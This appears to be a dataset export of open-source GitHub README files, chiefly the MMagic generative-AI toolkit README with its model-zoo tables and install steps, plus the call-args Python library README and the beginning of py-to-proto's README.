          <li><a href=""configs/nafnet/README.md"">NAFNet (ECCV'2022)</a></li>
          <li><a href=""configs/restormer/README.md"">Restormer (CVPR'2022)</a></li>
        </ul>
      </td>
      <td>
        <ul>
          <li><a href=""configs/srcnn/README.md"">SRCNN (TPAMI'2015)</a></li>
          <li><a href=""configs/srgan_resnet/README.md"">SRResNet&SRGAN (CVPR'2016)</a></li>
          <li><a href=""configs/edsr/README.md"">EDSR (CVPR'2017)</a></li>
          <li><a href=""configs/esrgan/README.md"">ESRGAN (ECCV'2018)</a></li>
          <li><a href=""configs/rdn/README.md"">RDN (CVPR'2018)</a></li>
          <li><a href=""configs/dic/README.md"">DIC (CVPR'2020)</a></li>
          <li><a href=""configs/ttsr/README.md"">TTSR (CVPR'2020)</a></li>
          <li><a href=""configs/glean/README.md"">GLEAN (CVPR'2021)</a></li>
          <li><a href=""configs/liif/README.md"">LIIF (CVPR'2021)</a></li>
          <li><a href=""configs/real_esrgan/README.md"">Real-ESRGAN (ICCVW'2021)</a></li>
        </ul>
      </td>
    </tr>
</td>
    </tr>
  </tbody>
<tbody>
    <tr align=""center"" valign=""bottom"">
      <td>
        <b>Video Super-Resolution</b>
      </td>
      <td>
        <b>Video Interpolation</b>
      </td>
      <td>
        <b>Image Colorization</b>
      </td>
      <td>
        <b>Image Translation</b>
      </td>
    </tr>
    <tr valign=""top"">
      <td>
        <ul>
            <li><a href=""configs/edvr/README.md"">EDVR (CVPR'2018)</a></li>
            <li><a href=""configs/tof/README.md"">TOF (IJCV'2019)</a></li>
            <li><a href=""configs/tdan/README.md"">TDAN (CVPR'2020)</a></li>
            <li><a href=""configs/basicvsr/README.md"">BasicVSR (CVPR'2021)</a></li>
            <li><a href=""configs/iconvsr/README.md"">IconVSR (CVPR'2021)</a></li>
            <li><a href=""configs/basicvsr_pp/README.md"">BasicVSR++ (CVPR'2022)</a></li>
            <li><a href=""configs/real_basicvsr/README.md"">RealBasicVSR (CVPR'2022)</a></li>
      </ul>
      </td>
      <td>
        <ul>
          <li><a href=""configs/tof/README.md"">TOFlow (IJCV'2019)</a></li>
          <li><a href=""configs/cain/README.md"">CAIN (AAAI'2020)</a></li>
          <li><a href=""configs/flavr/README.md"">FLAVR (CVPR'2021)</a></li>
        </ul>
      </td>
      <td>
        <ul>
          <li><a href=""configs/inst_colorization/README.md"">InstColorization (CVPR'2020)</a></li>
        </ul>
      </td>
      <td>
        <ul>
          <li><a href=""configs/pix2pix/README.md"">Pix2Pix (CVPR'2017)</a></li>
          <li><a href=""configs/cyclegan/README.md"">CycleGAN (ICCV'2017)</a></li>
        </ul>
      </td>
    </tr>
</td>
    </tr>
  </tbody>
<tbody>
    <tr align=""center"" valign=""bottom"">
      <td>
        <b>Inpainting</b>
      </td>
      <td>
        <b>Matting</b>
      </td>
      <td>
        <b>Text-to-Image</b>
      </td>
      <td>
        <b>3D-aware Generation</b>
      </td>
    </tr>
    <tr valign=""top"">
      <td>
        <ul>
          <li><a href=""configs/global_local/README.md"">Global&Local (ToG'2017)</a></li>
          <li><a href=""configs/deepfillv1/README.md"">DeepFillv1 (CVPR'2018)</a></li>
          <li><a href=""configs/partial_conv/README.md"">PConv (ECCV'2018)</a></li>
          <li><a href=""configs/deepfillv2/README.md"">DeepFillv2 (CVPR'2019)</a></li>
          <li><a href=""configs/aot_gan/README.md"">AOT-GAN (TVCG'2019)</a></li>
        </ul>
      </td>
      <td>
        <ul>
          <li><a href=""configs/dim/README.md"">DIM (CVPR'2017)</a></li>
          <li><a href=""configs/indexnet/README.md"">IndexNet (ICCV'2019)</a></li>
          <li><a href=""configs/mask2former"">GCA (AAAI'2020)</a></li>
        </ul>
      </td>
      <td>
        <ul>
          <li><a href=""projects/glide/configs/README.md"">GLIDE (NeurIPS'2021)</a></li>
          <li><a href=""configs/guided_diffusion/README.md"">Guided Diffusion (NeurIPS'2021)</a></li>
          <li><a href=""configs/disco_diffusion/README.md"">Disco-Diffusion (2022)</a></li>
          <li><a href=""configs/stable_diffusion/README.md"">Stable-Diffusion (2022)</a></li>
          <li><a href=""configs/dreambooth/README.md"">DreamBooth (2022)</a></li>
          <li><a href=""configs/controlnet/README.md"">ControlNet (2023)</a></li>
        </ul>
      </td>
      <td>
        <ul>
          <li><a href=""configs/eg3d/README.md"">EG3D (CVPR'2022)</a></li>
        </ul>
      </td>
    </tr>
</td>
    </tr>
  </tbody>
</table>

Please refer to [model_zoo](https://mmagic.readthedocs.io/en/latest/model_zoo/overview.html) for more details.

<p align=""right""><a href=""#top"">🔝Back to top</a></p>

## 🤝 Acknowledgement

MMagic is an open source project that is contributed by researchers and engineers from various colleges and companies. We wish that the toolbox and benchmark could serve the growing research community by providing a flexible toolkit to reimplement existing methods and develop their own new methods.

We appreciate all the contributors who implement their methods or add new features, as well as users who give valuable feedbacks. Thank you all!

<a href=""https://github.com/open-mmlab/mmagic/graphs/contributors"">
  <img src=""https://contrib.rocks/image?repo=open-mmlab/mmagic"" />
</a>

<p align=""right""><a href=""#top"">🔝Back to top</a></p>

## 🖊️ Citation

If MMagic is helpful to your research, please cite it as below.

```bibtex
@misc{mmagic2023,
    title = {{MMagic}: {OpenMMLab} Multimodal Advanced, Generative, and Intelligent Creation Toolbox},
    author = {{MMagic Contributors}},
    howpublished = {\url{https://github.com/open-mmlab/mmagic}},
    year = {2023}
}
```

```bibtex
@misc{mmediting2022,
    title = {{MMEditing}: {OpenMMLab} Image and Video Editing Toolbox},
    author = {{MMEditing Contributors}},
    howpublished = {\url{https://github.com/open-mmlab/mmediting}},
    year = {2022}
}
```

<p align=""right""><a href=""#top"">🔝Back to top</a></p>

## 🎫 License

This project is released under the [Apache 2.0 license](LICENSE).
Please refer to [LICENSES](LICENSE) for the careful check, if you are using our code for commercial matters.

<p align=""right""><a href=""#top"">🔝Back to top</a></p>

## 🏗️ ️OpenMMLab Family

- [MMEngine](https://github.com/open-mmlab/mmengine): OpenMMLab foundational library for training deep learning models.
- [MMCV](https://github.com/open-mmlab/mmcv): OpenMMLab foundational library for computer vision.
- [MIM](https://github.com/open-mmlab/mim): MIM installs OpenMMLab packages.
- [MMPreTrain](https://github.com/open-mmlab/mmpretrain): OpenMMLab Pre-training Toolbox and Benchmark.
- [MMDetection](https://github.com/open-mmlab/mmdetection): OpenMMLab detection toolbox and benchmark.
- [MMDetection3D](https://github.com/open-mmlab/mmdetection3d): OpenMMLab's next-generation platform for general 3D object detection.
- [MMRotate](https://github.com/open-mmlab/mmrotate): OpenMMLab rotated object detection toolbox and benchmark.
- [MMSegmentation](https://github.com/open-mmlab/mmsegmentation): OpenMMLab semantic segmentation toolbox and benchmark.
- [MMOCR](https://github.com/open-mmlab/mmocr): OpenMMLab text detection, recognition, and understanding toolbox.
- [MMPose](https://github.com/open-mmlab/mmpose): OpenMMLab pose estimation toolbox and benchmark.
- [MMHuman3D](https://github.com/open-mmlab/mmhuman3d): OpenMMLab 3D human parametric model toolbox and benchmark.
- [MMSelfSup](https://github.com/open-mmlab/mmselfsup): OpenMMLab self-supervised learning toolbox and benchmark.
- [MMRazor](https://github.com/open-mmlab/mmrazor): OpenMMLab model compression toolbox and benchmark.
- [MMFewShot](https://github.com/open-mmlab/mmfewshot): OpenMMLab fewshot learning toolbox and benchmark.
- [MMAction2](https://github.com/open-mmlab/mmaction2): OpenMMLab's next-generation action understanding toolbox and benchmark.
- [MMTracking](https://github.com/open-mmlab/mmtracking): OpenMMLab video perception toolbox and benchmark.
- [MMFlow](https://github.com/open-mmlab/mmflow): OpenMMLab optical flow toolbox and benchmark.
- [MMagic](https://github.com/open-mmlab/mmagic): OpenMMLab Multimodal Advanced, Generative, and Intelligent Creation Toolbox.
- [MMDeploy](https://github.com/open-mmlab/mmdeploy): OpenMMLab model deployment framework.

<p align=""right""><a href=""#top"">🔝Back to top</a></p>


","

 

Multimodal Advanced, Generative, and Intelligent Creation (MMagic [em'mædʒɪk])

 

OpenMMLab website


HOT


        
    OpenMMLab platform


TRY IT OUT



 

[![PyPI](https://badge.fury.io/py/mmagic.svg)](https://pypi.org/project/mmagic/)
[![docs](https://img.shields.io/badge/docs-latest-blue)](https://mmagic.readthedocs.io/en/latest/)
[![badge](https://github.com/open-mmlab/mmagic/workflows/build/badge.svg)](https://github.com/open-mmlab/mmagic/actions)
[![codecov](https://codecov.io/gh/open-mmlab/mmagic/branch/master/graph/badge.svg)](https://codecov.io/gh/open-mmlab/mmagic)
[![license](https://img.shields.io/github/license/open-mmlab/mmagic.svg)](https://github.com/open-mmlab/mmagic/blob/main/LICENSE)
[![open issues](https://isitmaintained.com/badge/open/open-mmlab/mmagic.svg)](https://github.com/open-mmlab/mmagic/issues)
[![issue resolution](https://isitmaintained.com/badge/resolution/open-mmlab/mmagic.svg)](https://github.com/open-mmlab/mmagic/issues)

[📘Documentation](https://mmagic.readthedocs.io/en/latest/) |
[🛠️Installation](https://mmagic.readthedocs.io/en/latest/get_started/install.html) |
[📊Model Zoo](https://mmagic.readthedocs.io/en/latest/model_zoo/overview.html) |
[🆕Update News](https://mmagic.readthedocs.io/en/latest/changelog.html) |
[🚀Ongoing Projects](https://github.com/open-mmlab/mmagic/projects) |
[🤔Reporting Issues](https://github.com/open-mmlab/mmagic/issues)

English | [简体中文](README_zh-CN.md)
















## 🚀 What's New 

### New release [**MMagic v1.0.0**](https://github.com/open-mmlab/mmagic/releases/tag/v1.0.0) \[25/04/2023\]:

We are excited to announce the release of MMagic v1.0.0 that inherits from [MMEditing](https://github.com/open-mmlab/mmediting) and [MMGeneration](https://github.com/open-mmlab/mmgeneration).

After iterative updates with OpenMMLab 2.0 framework and merged with MMGeneration, MMEditing has become a powerful tool that supports low-level algorithms based on both GAN and CNN. Today, MMEditing embraces Generative AI and transforms into a more advanced and comprehensive AIGC toolkit: **MMagic** (**M**ultimodal **A**dvanced, **G**enerative, and **I**ntelligent **C**reation). MMagic will provide more agile and flexible experimental support for researchers and AIGC enthusiasts, and help you on your AIGC exploration journey.

We highlight the following new features.

**1. New Models**

We support 11 new models in 4 new tasks.

- Text2Image / Diffusion
  - ControlNet
  - DreamBooth
  - Stable Diffusion
  - Disco Diffusion
  - GLIDE
  - Guided Diffusion
- 3D-aware Generation
  - EG3D
- Image Restoration
  - NAFNet
  - Restormer
  - SwinIR
- Image Colorization
  - InstColorization

**2. Magic Diffusion Model**

For the Diffusion Model, we provide the following ""magic"" :

- Support image generation based on Stable Diffusion and Disco Diffusion.
- Support Finetune methods such as Dreambooth and DreamBooth LoRA.
- Support controllability in text-to-image generation using ControlNet.
- Support acceleration and optimization strategies based on xFormers to improve training and inference efficiency.
- Support video generation based on MultiFrame Render.
- Support calling basic models and sampling strategies through DiffuserWrapper.

**3. Upgraded Framework**

By using MMEngine and MMCV of OpenMMLab 2.0 framework, MMagic has upgraded in the following new features:

- Refactor DataSample to support the combination and splitting of batch dimensions.
- Refactor DataPreprocessor and unify the data format for various tasks during training and inference.
- Refactor MultiValLoop and MultiTestLoop, supporting the evaluation of both generation-type metrics (e.g. FID) and reconstruction-type metrics (e.g. SSIM), and supporting the evaluation of multiple datasets at once.
- Support visualization on local files or using tensorboard and wandb.
- Support for 33+ algorithms accelerated by Pytorch 2.0.

**MMagic** has supported all the tasks, models, metrics, and losses in [MMEditing](https://github.com/open-mmlab/mmediting) and [MMGeneration](https://github.com/open-mmlab/mmgeneration) and unifies interfaces of all components based on [MMEngine](https://github.com/open-mmlab/mmengine) 😍.

Please refer to [changelog.md](docs/en/changelog.md) for details and release history.

Please refer to [migration documents](docs/en/migration/overview.md) to migrate from [old version](https://github.com/open-mmlab/mmagic/tree/0.x) MMEditing 0.x to new version MMagic 1.x .

## 📄 Table of Contents

- [📖 Introduction](#-introduction)
- [🙌 Contributing](#-contributing)
- [🛠️ Installation](#%EF%B8%8F-installation)
- [📊 Model Zoo](#-model-zoo)
- [🤝 Acknowledgement](#-acknowledgement)
- [🖊️ Citation](#%EF%B8%8F-citation)
- [🎫 License](#-license)
- [🏗️ ️OpenMMLab Family](#%EF%B8%8F-️openmmlab-family)

🔝Back to top

## 📖 Introduction

MMagic (**M**ultimodal **A**dvanced, **G**enerative, and **I**ntelligent **C**reation) is an advanced and comprehensive AIGC toolkit that inherits from [MMEditing](https://github.com/open-mmlab/mmediting) and [MMGeneration](https://github.com/open-mmlab/mmgeneration). It is an open-source image and video editing&generating toolbox based on PyTorch. It is a part of the [OpenMMLab](https://openmmlab.com/) project.

Currently, MMagic support multiple image and video generation/editing tasks.

https://user-images.githubusercontent.com/49083766/233564593-7d3d48ed-e843-4432-b610-35e3d257765c.mp4

The best practice on our main branch works with **Python 3.8+** and **PyTorch 1.9+**.

### ✨ Major features

- **State of the Art Models**

  MMagic provides state-of-the-art generative models to process, edit and synthesize images and videos.

- **Powerful and Popular Applications**

  MMagic supports popular and contemporary image restoration, text-to-image, 3D-aware generation, inpainting, matting, super-resolution and generation applications. Specifically, MMagic supports fine-tuning for stable diffusion and many exciting diffusion's application such as ControlNet Animation with SAM. MMagic also supports GAN interpolation, GAN projection, GAN manipulations and many other popular GAN’s applications. It’s time to begin your AIGC exploration journey!

- **Efficient Framework**

  By using MMEngine and MMCV of OpenMMLab 2.0 framework, MMagic decompose the editing framework into different modules and one can easily construct a customized editor framework by combining different modules. We can define the training process just like playing with Legos and provide rich components and strategies. In MMagic, you can complete controls on the training process with different levels of APIs. With the support of [MMSeparateDistributedDataParallel](https://github.com/open-mmlab/mmengine/blob/main/mmengine/model/wrappers/seperate_distributed.py), distributed training for dynamic architectures can be easily implemented.

🔝Back to top

## 🙌 Contributing

More and more community contributors are joining us to make our repo better. Some recent projects are contributed by the community including:

- [GLIDE](projects/glide/configs/README.md) is contributed by @Taited.
- [Restormer](configs/restormer/README.md) is contributed by @AlexZou14.
- [SwinIR](configs/swinir/README.md) is contributed by @Zdafeng.

[Projects](projects/README.md) is opened to make it easier for everyone to add projects to MMagic.

We appreciate all contributions to improve MMagic. Please refer to [CONTRIBUTING.md](https://github.com/open-mmlab/mmcv/blob/main/CONTRIBUTING.md) in MMCV and [CONTRIBUTING.md](https://github.com/open-mmlab/mmengine/blob/main/CONTRIBUTING.md) in MMEngine for more details about the contributing guideline.

🔝Back to top

## 🛠️ Installation

MMagic depends on [PyTorch](https://pytorch.org/), [MMEngine](https://github.com/open-mmlab/mmengine) and [MMCV](https://github.com/open-mmlab/mmcv).
Below are quick steps for installation.

**Step 1.**
Install PyTorch following [official instructions](https://pytorch.org/get-started/locally/).

**Step 2.**
Install MMCV, MMEngine and MMagic with [MIM](https://github.com/open-mmlab/mim).

```shell
pip3 install openmim
mim install 'mmcv>=2.0.0'
mim install 'mmengine'
mim install 'mmagic'
```

**Step 3.**
Verify MMagic has been successfully installed.

```shell
cd ~
python -c ""import mmagic; print(mmagic.__version__)""
# Example output: 1.0.0
```

**Getting Started**

After installing MMagic successfully, now you are able to play with MMagic! To generate an image from text, you only need several lines of codes by MMagic!

```python
from mmagic.apis import MMagicInferencer
sd_inferencer = MMagicInferencer(model_name='stable_diffusion')
text_prompts = 'A panda is having dinner at KFC'
result_out_dir = 'output/sd_res.png'
sd_inferencer.infer(text=text_prompts, result_out_dir=result_out_dir)
```

Please see [quick run](docs/en/get_started/quick_run.md) and [inference](docs/en/user_guides/inference.md) for the basic usage of MMagic.

**Install MMagic from source**

You can also experiment on the latest developed version rather than the stable release by installing MMagic from source with the following commands:

```shell
git clone https://github.com/open-mmlab/mmagic.git
cd mmagic
pip3 install -e .
```

Please refer to [installation](docs/en/get_started/install.md) for more detailed instruction.

🔝Back to top

## 📊 Model Zoo


Supported algorithms





Conditional GANs


Unconditional GANs


Image Restoration


Image Super-Resolution





SNGAN/Projection GAN (ICLR'2018)
SAGAN (ICML'2019)
BIGGAN/BIGGAN-DEEP (ICLR'2018)




DCGAN (ICLR'2016)
WGAN-GP (NeurIPS'2017)
LSGAN (ICCV'2017)
GGAN (ArXiv'2017)
PGGAN (ICLR'2018)
SinGAN (ICCV'2019)
StyleGANV1 (CVPR'2019)
StyleGANV2 (CVPR'2019)
StyleGANV3 (NeurIPS'2021)




SwinIR (ICCVW'2021)
NAFNet (ECCV'2022)
Restormer (CVPR'2022)




SRCNN (TPAMI'2015)
SRResNet&SRGAN (CVPR'2016)
EDSR (CVPR'2017)
ESRGAN (ECCV'2018)
RDN (CVPR'2018)
DIC (CVPR'2020)
TTSR (CVPR'2020)
GLEAN (CVPR'2021)
LIIF (CVPR'2021)
Real-ESRGAN (ICCVW'2021)









Video Super-Resolution


Video Interpolation


Image Colorization


Image Translation





EDVR (CVPR'2018)
TOF (IJCV'2019)
TDAN (CVPR'2020)
BasicVSR (CVPR'2021)
IconVSR (CVPR'2021)
BasicVSR++ (CVPR'2022)
RealBasicVSR (CVPR'2022)




TOFlow (IJCV'2019)
CAIN (AAAI'2020)
FLAVR (CVPR'2021)




InstColorization (CVPR'2020)




Pix2Pix (CVPR'2017)
CycleGAN (ICCV'2017)









Inpainting


Matting


Text-to-Image


3D-aware Generation





Global&Local (ToG'2017)
DeepFillv1 (CVPR'2018)
PConv (ECCV'2018)
DeepFillv2 (CVPR'2019)
AOT-GAN (TVCG'2019)




DIM (CVPR'2017)
IndexNet (ICCV'2019)
GCA (AAAI'2020)




GLIDE (NeurIPS'2021)
Guided Diffusion (NeurIPS'2021)
Disco-Diffusion (2022)
Stable-Diffusion (2022)
DreamBooth (2022)
ControlNet (2023)




EG3D (CVPR'2022)








Please refer to [model_zoo](https://mmagic.readthedocs.io/en/latest/model_zoo/overview.html) for more details.

🔝Back to top

## 🤝 Acknowledgement

MMagic is an open source project that is contributed by researchers and engineers from various colleges and companies. We wish that the toolbox and benchmark could serve the growing research community by providing a flexible toolkit to reimplement existing methods and develop their own new methods.

We appreciate all the contributors who implement their methods or add new features, as well as users who give valuable feedbacks. Thank you all!




🔝Back to top

## 🖊️ Citation

If MMagic is helpful to your research, please cite it as below.

```bibtex
@misc{mmagic2023,
    title = {{MMagic}: {OpenMMLab} Multimodal Advanced, Generative, and Intelligent Creation Toolbox},
    author = {{MMagic Contributors}},
    howpublished = {\url{https://github.com/open-mmlab/mmagic}},
    year = {2023}
}
```

```bibtex
@misc{mmediting2022,
    title = {{MMEditing}: {OpenMMLab} Image and Video Editing Toolbox},
    author = {{MMEditing Contributors}},
    howpublished = {\url{https://github.com/open-mmlab/mmediting}},
    year = {2022}
}
```

🔝Back to top

## 🎫 License

This project is released under the [Apache 2.0 license](LICENSE).
Please refer to [LICENSES](LICENSE) for the careful check, if you are using our code for commercial matters.

🔝Back to top

## 🏗️ ️OpenMMLab Family

- [MMEngine](https://github.com/open-mmlab/mmengine): OpenMMLab foundational library for training deep learning models.
- [MMCV](https://github.com/open-mmlab/mmcv): OpenMMLab foundational library for computer vision.
- [MIM](https://github.com/open-mmlab/mim): MIM installs OpenMMLab packages.
- [MMPreTrain](https://github.com/open-mmlab/mmpretrain): OpenMMLab Pre-training Toolbox and Benchmark.
- [MMDetection](https://github.com/open-mmlab/mmdetection): OpenMMLab detection toolbox and benchmark.
- [MMDetection3D](https://github.com/open-mmlab/mmdetection3d): OpenMMLab's next-generation platform for general 3D object detection.
- [MMRotate](https://github.com/open-mmlab/mmrotate): OpenMMLab rotated object detection toolbox and benchmark.
- [MMSegmentation](https://github.com/open-mmlab/mmsegmentation): OpenMMLab semantic segmentation toolbox and benchmark.
- [MMOCR](https://github.com/open-mmlab/mmocr): OpenMMLab text detection, recognition, and understanding toolbox.
- [MMPose](https://github.com/open-mmlab/mmpose): OpenMMLab pose estimation toolbox and benchmark.
- [MMHuman3D](https://github.com/open-mmlab/mmhuman3d): OpenMMLab 3D human parametric model toolbox and benchmark.
- [MMSelfSup](https://github.com/open-mmlab/mmselfsup): OpenMMLab self-supervised learning toolbox and benchmark.
- [MMRazor](https://github.com/open-mmlab/mmrazor): OpenMMLab model compression toolbox and benchmark.
- [MMFewShot](https://github.com/open-mmlab/mmfewshot): OpenMMLab fewshot learning toolbox and benchmark.
- [MMAction2](https://github.com/open-mmlab/mmaction2): OpenMMLab's next-generation action understanding toolbox and benchmark.
- [MMTracking](https://github.com/open-mmlab/mmtracking): OpenMMLab video perception toolbox and benchmark.
- [MMFlow](https://github.com/open-mmlab/mmflow): OpenMMLab optical flow toolbox and benchmark.
- [MMagic](https://github.com/open-mmlab/mmagic): OpenMMLab Multimodal Advanced, Generative, and Intelligent Creation Toolbox.
- [MMDeploy](https://github.com/open-mmlab/mmdeploy): OpenMMLab model deployment framework.

🔝Back to top
",open-mmlab/mmagic
call-args,https://github.com/vsego/call-args,0,5535,5535,"# CallArgs

Call functions and create objects by easily assigning values of keyword arguments from some object's attributes of or items from some dictionary.

## Content

1. [Usage](#usage)
2. [Variable keyword arguments](#variable-keyword-arguments)
3. [Extra arguments](#extra-arguments)
4. [Extending the package's functionality](#extending-the-packages-functionality)

## Usage

When calling a function `f` with keyword arguments contained in a dictionary `d`, one can do something like this:

```python
result = f(a=d[""a""], b=d[""b""],...)
```

or simply unpack `d`:

```python
result = f(**d)
```

Similarly, using attributes of object `obj`, one can do

```python
result = f(a=obj.a, b=obj.b,...)
```

or simply unpack d:

```python
result = f(**vars(d))
```

In both of these cases, the first approach can get tedious if there are many arguments and/or when adding new ones, while the second approach is problematic if a dictionary/object has some items/attributes that `f` does not accept (which is almost always the case with objects' attributes).

Instead, the above calls can be done like this:

```python
from call_args import call_args_dict
result = call_args_dict(f, d)
```

or

```python
from call_args import call_args_attr
result = call_args_attr(f, obj)
```

This can be useful in cases when a dictionary or an object exists specifically for the use with the given callable. For example, when using with command-line arguments:

```python
parser = argparse.ArgumentParser(
    prog=splitext(basename(sys.argv[0]))[0],
    description=sys.modules[__name__].__doc__,
)
...
args = parser.parse_args()
call_args_attr(ClassThatDoesTheJob, args).run()
```

The `call_args_*` functions filter out the values that `f` would not understand, as well as all the private ones (those with names starting with underscore `_`).

## Variable keyword arguments

If the callable allows variable keyword arguments, then the whole source will be used. This means that

```python
def f(**kwargs):
    ...

result1 = call_args_dict(f, d)
result2 = call_args_attr(f, obj)
```

is _mostly_ equivalent to

```python
def f(**kwargs):
    ...

result1 = f(**d)
result2 = f(**vars(obj))
```

However, there is still a difference: even in this case, `call_args_*` functions will not assign values to private arguments, which means that all the items from `d` and attributes from `obj` with names starting with an underscore `_` will be omitted.

Also, in the case of an object - which might have methods - filtering of names is still useful, as those won't be unpacked (unless the callable expects attributes with exactly those names).

## Extra arguments

The calls presented above can accept extra arguments. For example,

```python
def f(a=17, b=19, c=23):
    print(a, b, c)

data = {""b"": ""29"", ""c"": 31, ""d"": 37}
call_args_dict(f, data, c=41)
```

will print `17 29 41` because:

* `a` is not defined in `data` nor among keyword arguments of `call_args_dict`, so it retains its default value;

* `b` is defined only in `data`, getting its value 29 from there;

* `c` is defined in `data`, but also in keyword arguments of `call_args_dict`, which are prioritised and thus provide the value 41;

* `d` is defined in `data`, but it is not accepted by `f`, so `call_args_dict` silently drops it.

Note that explicitly given keyword arguments are always passed to `f`. This call:

```python
call_args_dict(f, {""b"": ""29"", ""c"": 31, ""d"": 37}, c=41, e=43)
```

raises a `TypeError` exception with a message

```
TypeError: f() got an unexpected keyword argument 'e'
```

## Extending the package's functionality

The work here is done by the class `CallArgs`. Other ""classes"" (`CallArgsAttr` specifically for working with attributes and `CallArgsDict` for working with dictionaries) are dynamically generated, and they are not classes at all. They are `partial` objects.

The two functions used above are also dynamically generated.

So, in order to modify or extend the functionality presented above, one only needs to inherit `CallArgs`, and then recreate these two partials and two functions.

Let us assume that we have a new class `NewCallArgs`, inherited from `CallArgs`. These interfaces are created with one of the following calls:

```python
# All four together:
CallArgsAttr, CallArgsDict, call_args_attr, call_args_dict = build_interfaces(
    NewCallArgs,
)
# Only ""classes"" (partials):
CallArgsAttr, CallArgsDict = build_classes(NewCallArgs)
)
# Only functions:
call_args_attr, call_args_dict = build_functions(NewCallArgs)
```

The `build_*` functions accept extra keyword arguments that are passed on to
the class constructor, in order to easily modify the default behaviour.
Currently, there are two such arguments:

```python
call_args_attr2, call_args_dict2 = build_functions(
    CallArgs, kwargs_as_default=True, skip_private=False,
)
```

Setting `skip_private` to `False` means that the functions will no longer filter out such attributes.

Seeting `kwargs_as_default` to `True` changes the meaning of keyword arguments in the newly created functions, so that they are treated as default values instead of overrides of the data. Let us reuse one of the above examples:

```python
def f(a=17, b=19, c=23):
    print(a, b, c)

data = {""b"": ""29"", ""c"": 31, ""d"": 37}

# Default behaviour described above:
call_args_dict(f, data, c=41)
# 17 29 41

# Modified behaviour where `c=41` serves as a default value:
call_args_dict2(f, data, c=41)
# 17 29 31  -> 31 comes from `data`
data.pop(""c"")
call_args_dict2(f, data, c=41)
# 17 29 41
```
","# CallArgs

Call functions and create objects by easily assigning values of keyword arguments from some object's attributes of or items from some dictionary.

## Content

1. [Usage](#usage)
2. [Variable keyword arguments](#variable-keyword-arguments)
3. [Extra arguments](#extra-arguments)
4. [Extending the package's functionality](#extending-the-packages-functionality)

## Usage

When calling a function `f` with keyword arguments contained in a dictionary `d`, one can do something like this:

```python
result = f(a=d[""a""], b=d[""b""],...)
```

or simply unpack `d`:

```python
result = f(**d)
```

Similarly, using attributes of object `obj`, one can do

```python
result = f(a=obj.a, b=obj.b,...)
```

or simply unpack d:

```python
result = f(**vars(d))
```

In both of these cases, the first approach can get tedious if there are many arguments and/or when adding new ones, while the second approach is problematic if a dictionary/object has some items/attributes that `f` does not accept (which is almost always the case with objects' attributes).

Instead, the above calls can be done like this:

```python
from call_args import call_args_dict
result = call_args_dict(f, d)
```

or

```python
from call_args import call_args_attr
result = call_args_attr(f, obj)
```

This can be useful in cases when a dictionary or an object exists specifically for the use with the given callable. For example, when using with command-line arguments:

```python
parser = argparse.ArgumentParser(
    prog=splitext(basename(sys.argv[0]))[0],
    description=sys.modules[__name__].__doc__,
)
...
args = parser.parse_args()
call_args_attr(ClassThatDoesTheJob, args).run()
```

The `call_args_*` functions filter out the values that `f` would not understand, as well as all the private ones (those with names starting with underscore `_`).

## Variable keyword arguments

If the callable allows variable keyword arguments, then the whole source will be used. This means that

```python
def f(**kwargs):
    ...

result1 = call_args_dict(f, d)
result2 = call_args_attr(f, obj)
```

is _mostly_ equivalent to

```python
def f(**kwargs):
    ...

result1 = f(**d)
result2 = f(**vars(obj))
```

However, there is still a difference: even in this case, `call_args_*` functions will not assign values to private arguments, which means that all the items from `d` and attributes from `obj` with names starting with an underscore `_` will be omitted.

Also, in the case of an object - which might have methods - filtering of names is still useful, as those won't be unpacked (unless the callable expects attributes with exactly those names).

## Extra arguments

The calls presented above can accept extra arguments. For example,

```python
def f(a=17, b=19, c=23):
    print(a, b, c)

data = {""b"": ""29"", ""c"": 31, ""d"": 37}
call_args_dict(f, data, c=41)
```

will print `17 29 41` because:

* `a` is not defined in `data` nor among keyword arguments of `call_args_dict`, so it retains its default value;

* `b` is defined only in `data`, getting its value 29 from there;

* `c` is defined in `data`, but also in keyword arguments of `call_args_dict`, which are prioritised and thus provide the value 41;

* `d` is defined in `data`, but it is not accepted by `f`, so `call_args_dict` silently drops it.

Note that explicitly given keyword arguments are always passed to `f`. This call:

```python
call_args_dict(f, {""b"": ""29"", ""c"": 31, ""d"": 37}, c=41, e=43)
```

raises a `TypeError` exception with a message

```
TypeError: f() got an unexpected keyword argument 'e'
```

## Extending the package's functionality

The work here is done by the class `CallArgs`. Other ""classes"" (`CallArgsAttr` specifically for working with attributes and `CallArgsDict` for working with dictionaries) are dynamically generated, and they are not classes at all. They are `partial` objects.

The two functions used above are also dynamically generated.

So, in order to modify or extend the functionality presented above, one only needs to inherit `CallArgs`, and then recreate these two partials and two functions.

Let us assume that we have a new class `NewCallArgs`, inherited from `CallArgs`. These interfaces are created with one of the following calls:

```python
# All four together:
CallArgsAttr, CallArgsDict, call_args_attr, call_args_dict = build_interfaces(
    NewCallArgs,
)
# Only ""classes"" (partials):
CallArgsAttr, CallArgsDict = build_classes(NewCallArgs)
)
# Only functions:
call_args_attr, call_args_dict = build_functions(NewCallArgs)
```

The `build_*` functions accept extra keyword arguments that are passed on to
the class constructor, in order to easily modify the default behaviour.
Currently, there are two such arguments:

```python
call_args_attr2, call_args_dict2 = build_functions(
    CallArgs, kwargs_as_default=True, skip_private=False,
)
```

Setting `skip_private` to `False` means that the functions will no longer filter out such attributes.

Seeting `kwargs_as_default` to `True` changes the meaning of keyword arguments in the newly created functions, so that they are treated as default values instead of overrides of the data. Let us reuse one of the above examples:

```python
def f(a=17, b=19, c=23):
    print(a, b, c)

data = {""b"": ""29"", ""c"": 31, ""d"": 37}

# Default behaviour described above:
call_args_dict(f, data, c=41)
# 17 29 41

# Modified behaviour where `c=41` serves as a default value:
call_args_dict2(f, data, c=41)
# 17 29 31  -> 31 comes from `data`
data.pop(""c"")
call_args_dict2(f, data, c=41)
# 17 29 41
```
",vsego/call-args
py-to-proto,https://github.com/IBM/py-to-proto,3,5885,5885,"# PY To Proto

This library holds utilities for converting in-memory data schema representations to [Protobuf](https://developers.google.com/protocol-buffers). The intent is to allow python libraries to leverage the power of `protobuf` while maintaining the source-of-truth for their data in pure python and avoiding static build steps.

## Why?

The `protobuf` langauge is a powerful tool for defining language-agnostic, composable datastructures. `Protobuf` also offers cross-language compatibility so that a given set of definitions can be compiled into numerous target programming languages. The downside is that `protobuf` requires_a static built step to perform this `proto` -> `X` conversion step. Alternately, there are multiple ways of representing data schemas in pure python which allow a python library to interact with well-typed data objects. The downside here is that these structures can not easily be used from other programming languages. The pros/cons of these generally fall along the following lines:

-   `Protobuf`:
    -   **Advantages**
        -   Compact serialization
        -   Auto-generated [`grpc`](https://grpc.io/) client and service libraries
        -   Client libraries can be used from different programming languages
    -   **Disadvantages**
